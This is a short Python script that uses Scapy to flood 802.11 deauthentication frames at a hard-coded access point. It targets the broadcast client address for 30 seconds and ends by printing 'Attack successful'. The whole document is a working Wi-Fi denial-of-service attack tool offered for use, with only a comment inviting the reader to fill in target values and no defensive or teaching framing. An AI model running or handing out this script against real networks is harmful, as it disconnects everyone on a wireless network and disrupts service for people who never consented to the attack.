from scapy.all import *

import time



def send_deauth(ap_mac, client_mac, interface):

    pkt = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()

    start_time = time.time()

    while time.time() - start_time < 30:

        sendp(pkt, iface=interface, count=10, inter=0.2, verbose=0)

        print("Deauthentication packet sent")

        time.sleep(0.5)

    print("Attack successful")



# Replace with your target values

ap_mac = "BE:06:E0:8A:B3:92"  # Access Point MAC

client_mac = "FF:FF:FF:FF:FF:FF"  # Client MAC or Broadcast

interface = "wlan0"



send_deauth(ap_mac, client_mac, interface)

